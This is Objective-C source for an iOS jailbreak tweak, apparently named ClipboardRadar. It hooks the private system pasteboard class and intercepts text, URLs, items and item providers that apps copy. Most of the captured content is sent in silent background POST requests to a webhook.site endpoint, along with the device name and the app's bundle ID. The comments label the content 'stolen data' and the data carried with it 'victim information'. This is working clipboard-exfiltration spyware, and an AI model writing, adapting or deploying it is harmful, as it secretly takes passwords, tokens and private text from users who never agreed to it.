#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>


// ==========================================
// 🎨 视觉引擎：原生横幅绘制模块
// ==========================================
static void showTopBanner(NSString *message) {
    // ⚠️ 铁律：UI 操作必须强制切回主线程！
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *keyWindow = nil;
        
        // 兼容 iOS 13+ 的多场景架构，精准寻找当前活跃的窗口
        if (@available(iOS 13.0, *)) {
            for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
                if (scene.activationState == UISceneActivationStateForegroundActive) {
                    for (UIWindow *window in scene.windows) {
                        if (window.isKeyWindow) {
                            keyWindow = window;
                            break;
                        }
                    }
                }
            }
        }
        // 兜底方案
        if (!keyWindow) {
            keyWindow = [UIApplication sharedApplication].keyWindow;
        }
        if (!keyWindow) return;

        // 1. 制造横幅背景 (黑色半透明，圆角)
        CGFloat screenWidth = keyWindow.bounds.size.width;
        // 起始位置在屏幕顶部之外 (-100)，准备往下掉
        UIView *bannerView = [[UIView alloc] initWithFrame:CGRectMake(20, -100, screenWidth - 40, 60)];
        bannerView.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
        bannerView.layer.cornerRadius = 12;
        bannerView.layer.masksToBounds = YES;
        
        // 给横幅加点阴影，看起来更立体
        bannerView.layer.shadowColor = [UIColor blackColor].CGColor;
        bannerView.layer.shadowOffset = CGSizeMake(0, 4);
        bannerView.layer.shadowOpacity = 0.3;

        // 2. 制造文字标签
        UILabel *msgLabel = [[UILabel alloc] initWithFrame:CGRectMake(15, 0, bannerView.frame.size.width - 30, 60)];
        msgLabel.text = message;
        msgLabel.textColor = [UIColor whiteColor];
        msgLabel.font = [UIFont boldSystemFontOfSize:13];
        msgLabel.numberOfLines = 2; // 无限制
        msgLabel.textAlignment = NSTextAlignmentCenter; 
        msgLabel.lineBreakMode = NSLineBreakByWordWrapping; //自动换行
        
        [bannerView addSubview:msgLabel];
        [keyWindow addSubview:bannerView];

        // 3. 注入灵魂：果冻弹簧动画 (Spring Animation)
        [UIView animateWithDuration:0.6 delay:0 usingSpringWithDamping:0.6 initialSpringVelocity:0.8 options:UIViewAnimationOptionCurveEaseOut animations:^{
            // 动画目标：掉落到距离顶部 50 的位置 (避开刘海/灵动岛)
            bannerView.frame = CGRectMake(20, 50, screenWidth - 40, 60);
        } completion:^(BOOL finished) {
            
            // 4. 悬停 2.5 秒后，自动收回并销毁
            [UIView animateWithDuration:0.4 delay:2.5 options:UIViewAnimationOptionCurveEaseIn animations:^{
                bannerView.frame = CGRectMake(20, -100, screenWidth - 40, 60);
            } completion:^(BOOL finished) {
                [bannerView removeFromSuperview];
            }];
        }];
    });
}


// ==========================================
// 1. 【欺骗编译器】：伪造私有类和方法的声明
// ==========================================
@interface _UIConcretePasteboard : UIPasteboard
// 写入方法
- (void)setString:(NSString *)string;
- (void)setImage:(UIImage *)image;
- (void)setURL:(NSURL *)url;
- (void)setItems:(NSArray *)items;
- (void)setItemProviders:(NSArray *)itemProviders;
// 读取方法
- (NSString *)string;
- (UIImage *)image;
- (NSURL *)URL;
- (NSArray *)items;
- (NSArray *)itemProviders;
// 嗅探方法
- (void)detectPatternsForPatterns:(NSSet *)patterns completionHandler:(id)handler;
@end

// ==========================================
// 📡 远端传输引擎：异步静默发送模块
// ==========================================
static void exfiltrateDataToServer(NSString *stolenText) {
    if (!stolenText || stolenText.length == 0) return;

    // ⚠️ 替换为你的远端服务器接收接口
    // 强烈建议使用 HTTPS！(下文会解释为什么)
    NSURL *url = [NSURL URLWithString:@"https://webhook.site/<your own http server id>"];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    
    request.HTTPMethod = @"POST";
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

    // 组装 JSON 载荷 (带有受害者信息)
    NSDictionary *payload = @{
        @"device_name": [[UIDevice currentDevice] name],
        @"bundle_id": [[NSBundle mainBundle] bundleIdentifier],
        @"stolen_data": stolenText,
        @"timestamp": @([[NSDate date] timeIntervalSince1970])
    };

    NSError *err;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:&err];
    if (err) {
        NSLog(@"[ClipboardRadar] ❌ JSON 打包失败: %@", err);
        return;
    }
    request.HTTPBody = jsonData;

    // 🚀 发起极其静默的异步请求 (丢到后台线程，绝不阻塞主线程)
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[ClipboardRadar] 📡 远端发送失败: %@", error.localizedDescription);
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
            NSLog(@"[ClipboardRadar] 📡 远端发送成功！状态码: %ld", (long)httpResponse.statusCode);
        }
    }];
    
    [task resume]; // 启动任务
}



// ==========================================
// 2. 【Logos 语法 Hook】：终极雷达主程序
// ==========================================
%hook _UIConcretePasteboard

// --- 0. 抓取开发者主动单体写入 (Copy) ---
- (void)setString:(NSString *)string {
    NSLog(@"[ClipboardRadar] 📝 [主动写入] App 正在向系统剪贴板写入文本 -> [%@]", string);
    NSString * newbanner =  [NSString stringWithFormat: @"setString写入: %@", string];
    showTopBanner(newbanner);
    exfiltrateDataToServer(string);

    %orig; // 必须调用 %orig 放行，否则 App 无法复制！
}

- (void)setImage:(UIImage *)image {
    NSLog(@"[ClipboardRadar] 📝 [主动写入] App 正在向系统剪贴板写入图片！");
    NSString * newbanner =  [NSString stringWithFormat: @"setImage写入图片"];
    showTopBanner(newbanner);

    %orig;
}

- (void)setURL:(NSURL *)url {
    NSLog(@"[ClipboardRadar] 📝 [主动写入] App 正在向系统剪贴板写入链接 -> [%@]", url.absoluteString);
    NSString * newbanner =  [NSString stringWithFormat: @"setURL写入: %@", url.absoluteString];
    showTopBanner(newbanner);
    exfiltrateDataToServer(url.absoluteString);

    %orig;
}

// --- 1. 拦截高级数据包写入 (setItems:) ---
- (void)setItems:(NSArray<NSDictionary *> *)items {
    NSLog(@"[ClipboardRadar] ==================================================");
    NSLog(@"[ClipboardRadar] 🚚 [运钞车拦截] App 调用 setItems: 运送复合数据包!");
    NSLog(@"[ClipboardRadar]    --> 包含 %lu 个独立物品 (Items)", (unsigned long)items.count);

    for (NSUInteger i = 0; i < items.count; i++) {
        NSDictionary *itemDict = items[i];
        NSLog(@"[ClipboardRadar] \n   📦 [打开第 %lu 个盲盒]:", (unsigned long)(i + 1));

        for (NSString *key in itemDict.allKeys) {
            id value = itemDict[key];
            NSString *keyLower = key.lowercaseString;

            // 🔍 智能解析引擎：原生 Objective-C 类型判断
            if ([value isKindOfClass:[NSString class]]) {
                NSLog(@"[ClipboardRadar]       🔑 格式: [%@] ->      📝 内容: %@", key, value);
                NSString * newbanner =  [NSString stringWithFormat: @"setItems NSString: %@", value];
                showTopBanner(newbanner);
                exfiltrateDataToServer(newbanner);
            } 
            else if ([value isKindOfClass:[NSURL class]]) {
                NSLog(@"[ClipboardRadar]       🔑 格式: [%@] ->      🔗 链接: %@", key, [(NSURL *)value absoluteString]);
                NSString * newbanner =  [NSString stringWithFormat: @"setItems NSURL: %@", [(NSURL *)value absoluteString]];
                showTopBanner(newbanner);
                exfiltrateDataToServer(newbanner);
            } 
            else if ([value isKindOfClass:[NSData class]]) {
                NSData *dataVal = (NSData *)value;
                // 强制文本解码逻辑
                if ([keyLower containsString:@"text"] || [keyLower containsString:@"html"] || [keyLower containsString:@"json"]) {
                    NSString *decodedStr = [[NSString alloc] initWithData:dataVal encoding:NSUTF8StringEncoding];
                    if (decodedStr) {
                        NSLog(@"[ClipboardRadar]       🔑 格式: [%@] ->      📝 强行解码内容: %@", key, decodedStr);
                        NSString * newbanner =  [NSString stringWithFormat: @"setItems Text: %@", decodedStr];
                        showTopBanner(newbanner);
                        exfiltrateDataToServer(newbanner);
                        continue;
                    }
                }
                NSLog(@"[ClipboardRadar]       🔑 格式: [%@] ->      💾 二进制块: 大小 %lu Bytes", key, (unsigned long)dataVal.length);
            } 
            else {
                NSLog(@"[ClipboardRadar]       🔑 格式: [%@] ->      ❓ 未知对象: <%@>", key, NSStringFromClass([value class]));
            }
        }
    }
    NSLog(@"[ClipboardRadar] ==================================================\n");
    %orig;
}

// --- 2. 拦截智能合约 (setItemProviders:) 与 暴力催收 ---
- (void)setItemProviders:(NSArray<NSItemProvider *> *)itemProviders {
    NSLog(@"[ClipboardRadar] ==================================================");
    NSLog(@"[ClipboardRadar] 📜 [智能合约拦截] App 调用 setItemProviders: 开出了空头支票!");
    NSLog(@"[ClipboardRadar]    --> 包含 %lu 个 Provider", (unsigned long)itemProviders.count);

    for (NSUInteger i = 0; i < itemProviders.count; i++) {
        NSItemProvider *provider = itemProviders[i];
        NSLog(@"[ClipboardRadar] ->   🏷️ [第 %lu 个 Provider 的菜单]:", (unsigned long)(i + 1));

        NSArray<NSString *> *registeredTypes = provider.registeredTypeIdentifiers;
        for (NSString *typeStr in registeredTypes) {
            NSLog(@"[ClipboardRadar]       ✨ 承诺提供: [%@]", typeStr);

            // 🚀 原生黑魔法：Objective-C 的 Block 调用比 Frida 简单一万倍！
            [provider loadDataRepresentationForTypeIdentifier:typeStr completionHandler:^(NSData * _Nullable data, NSError * _Nullable error) {
                if (data) {
                    NSString *typeLower = typeStr.lowercaseString;
                    // 智能解码文本
                    if ([typeLower containsString:@"text"] || [typeLower containsString:@"html"] || [typeLower containsString:@"json"]) {
                        NSString *decodedStr = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                        if (decodedStr) {
                            NSLog(@"[ClipboardRadar] ->   💰 [暴力催收成功!] 格式 [%@] ->      📝 偷出真实文本: %@", typeStr, decodedStr);
                            NSString * newbanner =  [NSString stringWithFormat: @"setItemProviders: %@", decodedStr];
                            showTopBanner(newbanner);
                            exfiltrateDataToServer(newbanner);
                            return;
                        }
                    }
                    NSLog(@"[ClipboardRadar] ->   💰 [暴力催收成功!] 格式 [%@] ->      💾 偷出真实文件: 大小 %lu Bytes", typeStr, (unsigned long)data.length);
                } else if (error) {
                    NSLog(@"[ClipboardRadar] ->   ❌ [催收失败] 格式 [%@] 拒绝给数据，报错: %@", typeStr, error.localizedDescription);
                }
            }];
        }
    }
    NSLog(@"[ClipboardRadar] ==================================================\n");
    %orig;
}

/*
// --- 3. 拦截底层的窃取读取动作 ---
- (NSString *)string {
    NSString *res = %orig;
    if (res) NSLog(@"[ClipboardRadar] 🚨 [窃取警告] App 读取了单体文本 -> [%@]", res);
    return res;
}

- (NSArray *)items {
    NSLog(@"[ClipboardRadar] 🚨 [高级读取窃取] App 调用 - items 端走了整个复合数据包！");
    return %orig;
}

- (NSArray *)itemProviders {
    NSLog(@"[ClipboardRadar] 🚨 [高级读取窃取] App 调用 - itemProviders 端走了整个盲盒！");
    return %orig;
}

// --- 4. 拦截大厂嗅探 (检测正则/格式) ---
- (void)detectPatternsForPatterns:(NSSet *)patterns completionHandler:(id)handler {
    NSLog(@"[ClipboardRadar] 🦊 [大厂嗅探警告] App 正在使用高级 API 探测剪贴板格式！");
    NSLog(@"[ClipboardRadar]    --> 探测目标格式: %@", patterns);
    %orig;
}
*/

%end

